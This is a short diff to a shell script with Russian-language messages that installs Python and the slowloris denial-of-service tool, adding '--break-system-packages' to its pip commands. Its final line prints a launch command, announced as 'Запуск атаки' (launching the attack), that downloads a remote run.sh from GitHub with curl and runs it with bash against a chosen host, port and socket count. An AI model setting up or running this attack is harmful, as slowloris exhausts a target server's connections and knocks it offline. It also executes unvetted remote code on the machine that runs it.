@@ -11,8 +11,8 @@ echo "[+] Ставлю python..."
 pkg install -y python
 
 echo "[+] Ставлю slowloris (gkbrk, PyPI)..."
-pip install --upgrade pip
-pip install slowloris
+pip install --upgrade pip --break-system-packages
+pip install --break-system-packages slowloris
 
 echo "[+] Готово. Запуск атаки:"
 echo "    curl -o run.sh https://raw.githubusercontent.com/AndriiMSN/slowattack_bash/main/run.sh && bash run.sh <HOST> <PORT> <SOCKETS>"
